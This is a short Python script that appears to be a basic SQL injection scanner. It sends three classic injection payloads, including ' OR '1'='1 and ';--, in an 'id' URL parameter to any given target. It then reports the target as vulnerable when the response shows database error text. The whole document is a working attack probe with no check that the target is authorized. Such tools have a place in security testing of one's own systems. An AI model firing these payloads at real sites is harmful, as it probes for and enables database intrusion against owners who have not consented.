import requests

payloads = ["' OR '1'='1", "';--", "\" OR \"1\"=\"1"]

def sql_injection_test(target):
    results = []
    for p in payloads:
        try:
            url = f"{target}?id={p}"
            r = requests.get(url, timeout=5)
            if any(err in r.text.lower() for err in ["sql", "mysql", "syntax error", "database"]):
                results.append({"payload": p, "vulnerable": True})
        except:
            pass
    return {"results": results or "No SQLi detected"}
